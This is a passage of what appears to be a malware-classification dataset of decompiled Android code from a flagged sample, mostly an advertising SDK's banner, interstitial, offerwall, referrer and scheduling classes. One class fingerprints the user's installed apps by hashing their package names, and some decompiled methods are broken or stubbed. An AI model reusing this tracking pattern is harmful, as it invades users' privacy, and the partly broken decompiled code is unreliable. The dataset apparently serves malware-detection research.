 float f){     this.b=f;     super.setTextSize(f);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\x.code","public final class x extends TextView {   int a;   float b;   String c;   private int d;   private float e;   public x(  Context context){     super(context);     this.a=-1;     this.b=-1.0f;     this.c="""";     setMaxLines(1);     this.e=getTextSize();   }   public static float a(  String str,  int i,  int i2,  int i3,  float f,  Paint paint,  Typeface typeface){     float f2;     Paint paint2=new Paint();     paint2.set(paint);     TextPaint textPaint=new TextPaint(paint2);     textPaint.setTypeface(typeface);     if (a(f,textPaint,str,i,i2,i3)) {       float f3=f;       float f4=2.0f;       while (f3 - f4 > 0.5f) {         float f5=(f3 + f4) / 2.0f;         if (a(f5,textPaint,str,i,i2,i3)) {           f3=f5;         }  else {           f4=f5;         }       }       f2=f4;     }  else {       f2=f;     }     return f2 >= 10.0f ? FloatMath.floor(f2) : f2;   }   private static boolean a(  float f,  TextPaint textPaint,  String str,  int i,  int i2,  int i3){     textPaint.setTextSize(f);     StaticLayout staticLayout=new StaticLayout(str,textPaint,i,Layout.Alignment.ALIGN_NORMAL,1.0f,0.0f,false);     return staticLayout.getLineCount() > i3 || staticLayout.getHeight() > i2;   }   @Override protected final void onMeasure(  int i,  int i2){     float f;     super.onMeasure(i,i2);     float f2=this.e;     int size=View.MeasureSpec.getSize(i);     float f3=getResources().getDisplayMetrics().density;     if (size > 0) {       String charSequence=getText().toString();       if (size == this.a && charSequence.equals(this.c)) {         f=this.b;       }  else {         this.a=size;         this.c=charSequence;         int mode=View.MeasureSpec.getMode(i2);         int size2=(mode == Integer.MIN_VALUE || mode == 1073741824) ? View.MeasureSpec.getSize(i2) : Integer.MAX_VALUE;         int compoundPaddingLeft=size - ((getCompoundPaddingLeft() + getCompoundPaddingRight()) + 1);         f=compoundPaddingLeft > 0 ? a(getText().toString(),compoundPaddingLeft,size2 - ((getCompoundPaddingTop() + getCompoundPaddingBottom()) + 1),this.d,f3 * this.e,getPaint(),getTypeface()) : f2;         this.b=f;       }     }  else {       f=f2;     }     if (Math.abs(getTextSize() - f) > 0.1f) {       super.setTextSize(0,f);       super.onMeasure(i,i2);     }   }   @Override public final void setMaxLines(  int i){     super.setMaxLines(i);     this.d=i;   }   @Override public final void setTextSize(  float f){     super.setTextSize(f);     this.e=f;   }   @Override public final void setTextSize(  int i,  float f){     super.setTextSize(i,f);     this.e=getTextSize() / getResources().getDisplayMetrics().density;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\y.code","public final class y {   private ac a=null;   private Map b=new HashMap(); public static final class a extends f {     private final y d;     private final String e;     public a(    y yVar,    String str){       this.d=yVar;       this.e=str;     }     @Override public b a(){       byte[] bArr;       byte[] bArr2;       ac acVar=this.d.a;       HttpGet httpGet=new HttpGet(this.e);       if (acVar != null) {         try {           Exchanger exchanger=new Exchanger();           acVar.a((Object)this.e,(aa)new z(this,exchanger));           bArr=(byte[])exchanger.exchange(null);         }  catch (        Throwable th) {           return new b(null,th);         }       }  else {         bArr=null;       }       if (bArr == null) {         HttpResponse execute=ai.a().execute(httpGet);         try {           if (execute.getStatusLine().getStatusCode() == 404) {             return new b(null,new IOException(""Http 404""));           }           InputStream content=new BufferedHttpEntity(execute.getEntity()).getContent();           ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();           byte[] bArr3=new byte[32768];           while (content.available() > 0) {             byteArrayOutputStream.write(bArr3,0,content.read(bArr3));           }           byte[] byteArray=byteArrayOutputStream.toByteArray();           if (acVar != null && byteArrayOutputStream.size() < acVar.a() / 2) {             acVar.a(this.e,byteArray);           }           c.a(execute);           bArr2=byteArray;         }   finally {           c.a(execute);         }       }  else {         bArr2=bArr;       }       return new b(bArr2,null);     }     @Override protected final void a(    Object obj){       b bVar=(b)obj;       Map map=this.d.b; synchronized (map) {         List list=(List)map.get(this.e);         if (list != null) {           Iterator it=list.iterator();           while (it.hasNext()) {             ((aa)it.next()).a(bVar);           }         }         map.remove(this.e);       }     }   } public static class b {     private final byte[] a;     private final Throwable b;     public b(    byte[] bArr,    Throwable th){       this.a=bArr;       this.b=th;     }     public final byte[] a(){       return this.a;     }   }   public final void a(  java.lang.String r6,  cmn.aa r7){     throw new UnsupportedOperationException(""Method not decompiled: cmn.y.a(java.lang.String, cmn.aa):void"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\z.code","final class z implements aa {   final Exchanger a;   final y.a b;   public z(  y.a aVar,  Exchanger exchanger){     this.b=aVar;     this.a=exchanger;   }   @Override public final void a(  Object obj){     try {       this.a.exchange((byte[])obj);     }  catch (    InterruptedException e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\a.code","public class a implements Serializable {   private b a=b.SMART;   private EnumC0005a b=EnumC0005a.SMART;   public enum EnumC0005a {  SMART,   LIGHT,   DARK}   public enum b {  SMART,   MORE_APPS,   SINGLE_APP}   public b a(){     return this.a;   }   public EnumC0005a b(){     return this.b;   }   public boolean c(){     return this.a == b.SMART && this.b == EnumC0005a.SMART;   } } public interface a {   void a();   void a(  Bundle bundle);   boolean a(  int i);   void b();   void b(  Bundle bundle);   boolean c();   void d(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\AppBrainActivity.code","public class AppBrainActivity extends Activity {   private a a;   private long b; public interface a {     void a();     void a(    Bundle bundle);     boolean a(    int i);     void b();     void b(    Bundle bundle);     boolean c();     void d();   }   @Override public void onConfigurationChanged(  Configuration configuration){     super.onConfigurationChanged(configuration);     this.a.a();   }   @Override public void onCreate(  Bundle bundle){     cmn.a.a().a((Activity)this);     super.onCreate(bundle);     this.b=SystemClock.elapsedRealtime();     this.a=com.appbrain.a.a.a(this);     if (this.a == null) {       finish();     }  else {       this.a.a(bundle);     }   }   @Override protected void onDestroy(){     if (this.a != null) {       this.a.d();     }     super.onDestroy();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     boolean z=true;     if ((!this.a.c() || i != 4 || SystemClock.elapsedRealtime() >= this.b + 1500) && !this.a.a(i) && (z=super.onKeyDown(i,keyEvent))) {       ax.a().g();     }     return z;   }   @Override protected void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);     this.a.b(bundle);   }   @Override public void onStop(){     this.a.b();     super.onStop();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\AppBrainBanner.code","public class AppBrainBanner extends FrameLayout {   private m a;   public AppBrainBanner(  Context context){     super(context);     a(null);   }   public AppBrainBanner(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     a(attributeSet);   }   public AppBrainBanner(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     a(attributeSet);   }   private void a(  AttributeSet attributeSet){     cmn.a.a().a(this);     setLayoutParams(new FrameLayout.LayoutParams(-1,-2));     this.a=new m(this);     this.a.a(attributeSet);   }   public synchronized void a(){     if (getVisibility() == 0) {       this.a.b();     }   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     if (!this.a.a.get()) {       a();     }  else     if (this.a.b.get()) {       this.a.c();     }   }   @Override protected void onMeasure(  int i,  int i2){     if (View.MeasureSpec.getMode(i) == Integer.MIN_VALUE) {       i=View.MeasureSpec.makeMeasureSpec(View.MeasureSpec.getSize(i),1073741824);     }     super.onMeasure(i,View.MeasureSpec.makeMeasureSpec(this.a.a(),1073741824));   }   @Override public void onWindowFocusChanged(  boolean z){     if (z && this.a.b.get()) {       this.a.c();     }     super.onWindowFocusChanged(z);   }   public void setBannerListener(  d dVar){     this.a.a(dVar);   }   public void setButtonTextIndex(  int i){     this.a.f=i;     if (this.a.f < 0 || this.a.f >= m.h.length) {       this.a.f=0;     }   }   public void setColors(  int i){     this.a.d=i;     if (this.a.d < 0 || this.a.d >= bx.a.length) {       this.a.d=0;     }   }   public void setDesign(  int i){     this.a.c=i;     if (this.a.c < 0 || this.a.c >= bx.b.length) {       this.a.c=0;     }   }   public void setSingleAppDesign(  int i){     this.a.a(i);   }   public void setTitleIndex(  int i){     this.a.e=i;     if (this.a.e < 0 || this.a.e >= m.g.length) {       this.a.e=0;     }   }   @Override public void setVisibility(  int i){     super.setVisibility(i);     if (i != 0 || this.a.a.get()) {       return;     }     a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\AppBrainService.code","public class AppBrainService extends IntentService {   public AppBrainService(){     super(""AppBrain service"");   }   private static void a(  Context context,  long j){     PendingIntent service=PendingIntent.getService(context,0,new Intent(context,(Class<?>)AppBrainService.class),0);     AlarmManager alarmManager=(AlarmManager)context.getSystemService(""alarm"");     if (alarmManager == null) {       return;     }     alarmManager.cancel(service);     if (j != 0) {       alarmManager.setInexactRepeating(1,System.currentTimeMillis() + Math.max(j / 4,300000L),j,service);     }   }   @Override public void onCreate(){     super.onCreate();     c.b(this);   }   @Override protected void onHandleIntent(  Intent intent){     if (intent == null) {       return;     }     Context applicationContext=getApplicationContext();     if (t.a(applicationContext,intent)) {       return;     }     if (intent.hasExtra(""ip"")) {       String stringExtra=intent.getStringExtra(""ip"");       int intExtra=intent.getIntExtra(""cp2"",0);       a.k.C0015a n=a.k.n();       a.C0009a.C0010a l=a.C0009a.l();       l.a(stringExtra);       l.a(intExtra);       n.a(l);       try {         an.a(this,av.a(this).a(n.c()).h());         return;       }  catch (      Exception e) {         e.printStackTrace();         return;       }     }     if (intent.hasExtra(""event"")) {       au.a(intent.getStringExtra(""key""),intent.getStringExtra(""event""));     }     if (""com.appbrain.CHECK"".equals(intent.getAction())) {       Context applicationContext2=getApplicationContext();       int a=ak.a(applicationContext2);       AlarmManager alarmManager=(AlarmManager)applicationContext2.getSystemService(""alarm"");       if (alarmManager != null) {         Intent intent2=new Intent(applicationContext2,(Class<?>)AppBrainService.class);         intent2.setAction(""com.appbrain.CHECK"");         PendingIntent service=PendingIntent.getService(applicationContext2,0,intent2,0);         long elapsedRealtime=SystemClock.elapsedRealtime() + (a * 1000);         alarmManager.cancel(service);         if (a != 0) {           alarmManager.setRepeating(3,elapsedRealtime,a * 1000,service);         }       }     }     if (au.b(applicationContext)) {       a(applicationContext,0L);     }  else {       a(applicationContext,1800000L);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\AppBrainUnity.code","public class AppBrainUnity implements Proguard.KeepMembers {   public static void dontKillWhenDone(){     ax.a().a((Activity)null);   }   public static void killWhenDone(  Activity activity){     ax.a().a(activity);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\b.code","public interface b {   boolean a(  Context context); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\c.code","public class c {   public static b a(){     b();     return ax.a();   }   public static void a(  Context context){     ax.a().a(context,true);   }   private static void b(){     if (!ax.a().b()) {       throw new IllegalStateException(""Please call AppBrain.init(context) in the onCreate of your Activity, or AppBrain.initApp() in the onCreate of your Application or Service or as the first thing in a BroadcastReceiver"");     }   }   public static void b(  Context context){     ax.a().a(context,false);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\d.code","public interface d {   void a();   void a(  boolean z); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\e.code","public interface e {   String a(  String str);   String a(  String str,  String str2); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain\ReferrerReceiver.code","public class ReferrerReceiver extends BroadcastReceiver {   public static String a(  Context context){     be.a().a(context,false);     return be.a().j();   }   @Override public void onReceive(  Context context,  Intent intent){     ActivityInfo receiverInfo;     Bundle bundle;     Set<String> keySet;     int size;     ActivityInfo receiverInfo2;     ActivityInfo receiverInfo3;     try {       try {         String stringExtra=intent.getStringExtra(AdTrackerConstants.REFERRER);         if (stringExtra == null) {           ArrayList arrayList=new ArrayList();           try {             receiverInfo3=context.getPackageManager().getReceiverInfo(new ComponentName(context,(Class<?>)ReferrerReceiver.class),android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);           }  catch (          PackageManager.NameNotFoundException e) {             e.printStackTrace();           }           if (receiverInfo3 == null || receiverInfo3.metaData == null || receiverInfo3.metaData.keySet() == null || receiverInfo3.metaData.keySet().size() == 0) {             return;           }           for (          String str : receiverInfo3.metaData.keySet()) {             if (str.startsWith(""forward."")) {               arrayList.add(receiverInfo3.metaData.getString(str));             }           }           Iterator it=arrayList.iterator();           while (it.hasNext()) {             try {               Object newInstance=Class.forName((String)it.next()).newInstance();               if (newInstance instanceof BroadcastReceiver) {                 try {                   ((BroadcastReceiver)newInstance).onReceive(context,intent);                 }  catch (                Throwable th) {                 }               }             }  catch (            ClassNotFoundException e2) {             } catch (            IllegalAccessException e3) {             } catch (            InstantiationException e4) {             }           }           return;         }         be.a().a(context,false);         be.a().a(stringExtra);         ArrayList arrayList2=new ArrayList();         try {           receiverInfo2=context.getPackageManager().getReceiverInfo(new ComponentName(context,(Class<?>)ReferrerReceiver.class),android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);         }  catch (        PackageManager.NameNotFoundException e5) {           e5.printStackTrace();         }         if (receiverInfo2 == null || receiverInfo2.metaData == null || receiverInfo2.metaData.keySet() == null || receiverInfo2.metaData.keySet().size() == 0) {           return;         }         for (        String str2 : receiverInfo2.metaData.keySet()) {           if (str2.startsWith(""forward."")) {             arrayList2.add(receiverInfo2.metaData.getString(str2));           }         }         Iterator it2=arrayList2.iterator();         while (it2.hasNext()) {           try {             Object newInstance2=Class.forName((String)it2.next()).newInstance();             if (newInstance2 instanceof BroadcastReceiver) {               try {                 ((BroadcastReceiver)newInstance2).onReceive(context,intent);               }  catch (              Throwable th2) {               }             }           }  catch (          ClassNotFoundException e6) {           } catch (          IllegalAccessException e7) {           } catch (          InstantiationException e8) {           }         }         return;       }   finally {         if (receiverInfo != null) {           if (bundle != null) {             if (keySet != null) {               if (size != 0) {               }             }           }         }       }     }  catch (    Throwable th3) {       th3.printStackTrace();     }     th3.printStackTrace();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\a.code","public class a { public static class C0006a {     public final int a;     public final int b;     private C0006a(    int i,    int i2){       this.a=i;       this.b=i2;     }     public static C0006a a(){       StackTraceElement[] stackTrace=new Exception().getStackTrace();       StringBuffer stringBuffer=new StringBuffer();       String a=a(a.class.getName());       String str="""";       for (      StackTraceElement stackTraceElement : stackTrace) {         if (!a(stackTraceElement.getClassName()).equals(a)) {           stringBuffer.append(stackTraceElement.toString());           if (str.length() == 0) {             str=stackTraceElement.toString();           }         }       }       return new C0006a(str.hashCode(),stringBuffer.hashCode());     }     public static C0006a a(    Intent intent){       return intent == null ? new C0006a(-1,-1) : new C0006a(intent.getIntExtra(""hash_last"",-1),intent.getIntExtra(""hash"",-1));     }     private static String a(    String str){       int lastIndexOf=str.lastIndexOf(46);       return lastIndexOf != -1 ? str.substring(0,lastIndexOf) : str;     }     public final void b(    Intent intent){       intent.putExtra(""hash_last"",this.a);       intent.putExtra(""hash"",this.b);     }   }   private static Intent a(  Context context){     Intent intent=new Intent(context,(Class<?>)AppBrainActivity.class);     if (!(context instanceof Activity)) {       intent.addFlags(268435456);       intent.addFlags(8388608);     }     return intent;   }   public static AppBrainActivity.a a(  AppBrainActivity appBrainActivity){     if (appBrainActivity == null || appBrainActivity.getIntent() == null) {       return null;     }     String stringExtra=appBrainActivity.getIntent().getStringExtra(""activity"");     if (AdView.PLACEMENT_TYPE_INTERSTITIAL.equals(stringExtra)) {       return new x(appBrainActivity);     }     if (""offerwall"".equals(stringExtra)) {       return new ai(appBrainActivity);     }     if (""app_popup"".equals(stringExtra)) {       return new bi(appBrainActivity);     }     if (""redirect"".equals(stringExtra)) {       return new aq(appBrainActivity);     }     return null;   }   public static void a(  Context context,  int i,  String str){     StackTraceElement[] stackTrace=new Exception().getStackTrace();     boolean startsWith=stackTrace.length > 3 ? stackTrace[3].getClassName().startsWith(""android.view"") : false;     Intent a=a(context);     a.putExtra(""activity"",""offerwall"");     a.putExtra(AdTrackerConstants.SOURCE,j.h.BANNER.a());     a.putExtra(""bt"",i);     a.putExtra(""bo"",startsWith);     C0006a.a().b(a);     if (str != null) {       ai.a(str);     }     context.startActivity(a);   }   private static void a(  Context context,  com.appbrain.a aVar,  boolean z){     if (Build.VERSION.SDK_INT >= 11 && (context instanceof Activity) && !((Activity)context).isFinishing()) {       bp.a((Activity)context,aVar,z);       return;     }     Intent a=a(context);     a.putExtra(""activity"",""app_popup"");     a.putExtra(bi.a,aVar);     a.putExtra(bi.b,z);     context.startActivity(a);   }   public static void a(  Context context,  j.h hVar,  C0006a c0006a){     Intent a=a(context);     a.putExtra(""activity"",""offerwall"");     a.putExtra(AdTrackerConstants.SOURCE,hVar.a());     if (c0006a != null) {       c0006a.b(a);     }     context.startActivity(a);   }   public static void a(  Context context,  String str){     Intent a=a(context);     a.putExtra(""activity"",""redirect"");     a.setData(Uri.parse(str));     context.startActivity(a);   }   public static void a(  Context context,  boolean z,  C0006a c0006a,  boolean z2,  com.appbrain.a aVar){     if (aVar == null) {       aVar=new com.appbrain.a();     }     if (aVar.a() == a.b.MORE_APPS) {       b(context,z,c0006a,z2,aVar);       return;     }     if (aVar.a() == a.b.SINGLE_APP) {       a(context,aVar,z);       return;     }     if (Math.random() < be.a().a(""iskip"",0.0d)) {       a(context,j.h.SKIPPED_INTERSTITIAL,c0006a);       return;     }     if (Math.random() < be.a().a(""apppopup"",0.05d)) {       a(context,aVar,z);     }  else {       b(context,z,c0006a,z2,aVar);     }   }   private static void b(  Context context,  boolean z,  C0006a c0006a,  boolean z2,  com.appbrain.a aVar){     Intent a=a(context);     a.putExtra(""activity"",AdView.PLACEMENT_TYPE_INTERSTITIAL);     a.putExtra(""maybe"",z);     a.putExtra(""adop"",aVar);     if (z2) {       a.addFlags(32768);       a.putExtra(""ana"",""home"");     }     if (c0006a != null) {       c0006a.b(a);     }     context.startActivity(a);   } } public static class a {   public final int[] a;   public final int b;   public final int c; public static class C0007a {     private int a;     private int b;     private int c;     private int d;     private C0007a(){     }     C0007a(    byte b){       this();     }     public final C0007a a(    int i){       this.d=i;       return this;     }     public final C0007a a(    int i,    int i2){       this.a=i;       this.b=i2;       return this;     }     public final a a(){       return new a(this,(byte)0);     }     public final C0007a b(    int i){       this.c=i;       return this;     }   }   private a(  C0007a c0007a){     this.a=new int[]{c0007a.a,c0007a.b};     this.b=c0007a.c;     this.c=c0007a.d;   }   a(  C0007a c0007a,  byte b){     this(c0007a);   } } final class a extends WebChromeClient {   a(){   }   @Override public final boolean onJsAlert(  WebView webView,  String str,  String str2,  JsResult jsResult){     jsResult.confirm();     return true;   }   @Override public final void onProgressChanged(  WebView webView,  int i){     ProgressDialog progressDialog;     if (i > 20 && ai.this.c.getVisibility() != 8) {       ai.this.c.setVisibility(8);     }     if (i > 20 && ai.this.g.isShowing() && (progressDialog=ai.this.g) != null) {       if (progressDialog instanceof Dialog ? progressDialog.isShowing() : true) {         try {           progressDialog.dismiss();         }  catch (        Exception e) {         }       }     }     super.onProgressChanged(webView,i);   } } static class a implements Proguard.KeepMembers {   final ao a;   private final Activity b;   public a(  Activity activity,  ao aoVar){     this.a=aoVar;     this.b=activity;   }   @JavascriptInterface public void click(){     if (this.a != null) {       ak.a(this.b,this.a);       SharedPreferences d=be.a().d();       SharedPreferences.Editor edit=d.edit();       edit.putInt(""ow_click"",d.getInt(""ow_click"",0) + 1);       cmn.a.a().b(edit);     }   }   @JavascriptInterface public void close(){     this.b.finish();   }   @JavascriptInterface public boolean isPackageInstalled(  String str){     return cmn.q.a(this.b,str);   }   @JavascriptInterface public void openUrl(  String str,  boolean z){     if (z) {       ak.c(this.b,str);     }  else {       ak.a(this.b,str);     }   }   @JavascriptInterface public void reportSelected(  String str,  String str2,  String str3){     new Thread(new am(this,str,str2,str3)).start();     SharedPreferences d=be.a().d();     SharedPreferences.Editor edit=d.edit();     edit.putInt(""ow_imp"",d.getInt(""ow_imp"",0) + 1);     cmn.a.a().b(edit);   }   @JavascriptInterface public void trackClick(  String str,  String str2,  String str3){     ak.a(this.b,str,str2,str3);     SharedPreferences d=be.a().d();     SharedPreferences.Editor edit=d.edit();     edit.putInt(""ow_click"",d.getInt(""ow_click"",0) + 1);     cmn.a.a().b(edit);   } } public static class a {   private long a;   private List b=Collections.synchronizedList(new ArrayList());   private final long c=System.currentTimeMillis() - 2592000000L;   private a(){   }   private static int[] a(  List list){     int[] iArr=new int[list.size()];     int i=0;     while (true) {       int i2=i;       if (i2 >= list.size()) {         return iArr;       }       int a=(int)(cmn.s.a(((PackageInfo)list.get(i2)).packageName) & (-1));       String str=((PackageInfo)list.get(i2)).packageName + "": "" + a;       iArr[i2]=a;       i=i2 + 1;     }   }   public static a b(){     return new a();   }   final long a(){     return this.a;   }   public final void a(  long j){     this.b.clear();     this.a=j;   }   public final void a(  PackageInfo packageInfo,  String str){     if (az.b == null || (str != null && az.b.contains(str))) {       long a=az.a.a(packageInfo);       if (a > this.c) {         this.b.add(packageInfo);       }       if (a <= 0 || a >= this.a) {         return;       }       if (packageInfo.applicationInfo == null || (packageInfo.applicationInfo.flags & 1) != 0) {         return;       }       this.a=a;     }   }   public final String c(){     try {       ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);       com.appbrain.b.e a=com.appbrain.b.e.a(byteArrayOutputStream);       a.c(5);       Collections.sort(this.b,new bc(this));       if (this.b.size() > 16) {         this.b=this.b.subList(0,16);         for (int i=0; i < this.b.size(); i++) {           String str=((PackageInfo)this.b.get(i)).packageName;         }       }       int[] a2=a(this.b);       a.c(a2.length);       for (      int i2 : a2) {         String str2=""Vector: "" + i2;         a.d(i2);       }       a.a();       return cmn.t.b(byteArrayOutputStream.toByteArray());     }  catch (    Exception e) {       e.printStackTrace();       return """";     }   } } public static class a implements c {   @Override public final View a(  Context context,  String str,  String str2,  e eVar,  int i,  View.OnClickListener onClickListener){     LinearLayout linearLayout=new LinearLayout(context);     int b=cmn.ab.b(10.0f);     int b2=cmn.ab.b(30.0f);     int b3=cmn.ab.b(16.0f);     linearLayout.setOrientation(0);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(2);     xVar.setText(str);     xVar.setTextSize(13.0f);     xVar.setPadding(cmn.ab.b(12.0f),cmn.ab.b(6.0f),cmn.ab.b(6.0f),cmn.ab.b(6.0f));     xVar.setTextColor(eVar.c);     xVar.setTypeface(Typeface.SERIF);     cmn.a.a().a(linearLayout,new LayerDrawable(new Drawable[]{new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{eVar.a,eVar.b}),new by(this,eVar,b3,b,b2)}));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(0,-2);     layoutParams.gravity=17;     layoutParams.weight=2.0f;     layoutParams.leftMargin=cmn.ab.b(4.0f) + b;     linearLayout.addView(xVar,layoutParams);     cmn.w wVar=new cmn.w(context);     wVar.setMaxLines(2);     com.appbrain.d.a a=com.appbrain.d.a.a(context,0.5f,eVar.f);     a.a().setStrokeWidth(cmn.ab.a(1.4f));     a.setShaderFactory(new bz(this,i,eVar));     com.appbrain.a.b bVar=new com.appbrain.a.b(this,a);     wVar.setTextColor(eVar.g);     wVar.setText(str2);     wVar.setTextSize(13.0f);     wVar.setTypeface(Typeface.defaultFromStyle(1));     cmn.a.a().a(wVar,new InsetDrawable((Drawable)com.appbrain.d.c.a(context,a,bVar),cmn.ab.b(6.0f)));     wVar.setPadding(cmn.ab.b(12.0f),cmn.ab.b(12.0f),cmn.ab.b(12.0f),cmn.ab.b(12.0f));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.gravity=17;     linearLayout2.addView(wVar,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(0,-2);     layoutParams3.weight=1.0f;     layoutParams3.leftMargin=cmn.ab.b(2.0f);     layoutParams3.rightMargin=cmn.ab.b(2.0f) + b2;     layoutParams3.topMargin=cmn.ab.b(2.0f);     layoutParams3.bottomMargin=cmn.ab.b(2.0f);     layoutParams3.gravity=17;     wVar.setOnClickListener(onClickListener);     linearLayout.addView(linearLayout2,layoutParams3);     linearLayout.setWeightSum(3.0f);     return linearLayout;   } } public static class a {   private final int a;   private final boolean b;   private a(  int i,  boolean z){     this.a=i;     this.b=z;   }   a(  int i,  boolean z,  byte b){     this(i,z);   } } public static class a {   private final StringBuilder a=new StringBuilder();   private a a(  String str,  String str2){     this.a.append(""&"");     this.a.append(str);     this.a.append(""="");     this.a.append(str2);     return this;   }   public final a a(  int i){     return a(""it"",String.valueOf(i));   }   public final a a(  long j){     return a(""bi"",String.valueOf(j));   }   public final a a(  String str){     return a(""ic"",str);   }   public final a a(  boolean z){     return a(""sm"",z ? ""1"" : ""0"");   }   public final a b(  int i){     return a(""bt"",String.valueOf(i));   }   public final a b(  boolean z){     return a(""mb"",z ? ""1"" : ""0"");   }   public final String toString(){     return this.a.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\aa.code","public final class aa implements View.OnClickListener {   final x a;   public aa(  x xVar){     this.a=xVar;   }   @Override public final void onClick(  View view){     Activity activity;     activity=this.a.c;     activity.finish();     ax.a().g();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ab.code","public final class ab extends ShapeDrawable.ShaderFactory {   final ah.a a;   final x b;   public ab(  x xVar,  ah.a aVar){     this.b=xVar;     this.a=aVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,i2,this.a.a[0],this.a.a[1],Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ac.code","public final class ac extends ap {   public ac(  Context context){     super(context);   }   @Override public final void a(  m.a aVar,  h.a aVar2){     if (aVar instanceof j.k.a) {       ((j.k.a)aVar).a(aVar2);     }  else     if (aVar instanceof j.i.a) {       ((j.i.a)aVar).a(aVar2);     }  else {       if (!(aVar instanceof j.f.a)) {         throw new IllegalArgumentException(""Unknown builder type."");       }       ((j.f.a)aVar).a(aVar2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ad.code","public final class ad extends ShapeDrawable.ShaderFactory {   final int a;   final x b;   public ad(  x xVar,  int i){     this.b=xVar;     this.a=i;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,i2,new int[]{16777215,16777215,Integer.MAX_VALUE},new float[]{0.0f,(i2 - (this.a * 2)) / i2,1.0f},Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ae.code","public final class ae extends ShapeDrawable.ShaderFactory {   final int[] a;   final x b;   public ae(  x xVar,  int[] iArr){     this.b=xVar;     this.a=iArr;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,i2,this.a,(float[])null,Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\af.code","public final class af extends ShapeDrawable.ShaderFactory {   final x a;   public af(  x xVar){     this.a=xVar;   }   @Override public final Shader resize(  int i,  int i2){     return new RadialGradient(i / 2,i2 / 2,i / 2.0f,new int[]{-1593835521,1358954495,687865855,150994943,16777215},new float[]{0.0f,0.3f,0.56f,0.82f,1.0f},Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ag.code","public final class ag extends ShapeDrawable.ShaderFactory {   final int a;   final x b;   public ag(  x xVar,  int i){     this.b=xVar;     this.a=i;   }   @Override public final Shader resize(  int i,  int i2){     float f=i / 2.0f;     return new RadialGradient(i / 2,i2 / 2,f,new int[]{-1879048192,-1879048192,0},new float[]{0.0f,1.0f - (this.a / f),1.0f},Shader.TileMode.CLAMP);   } } "
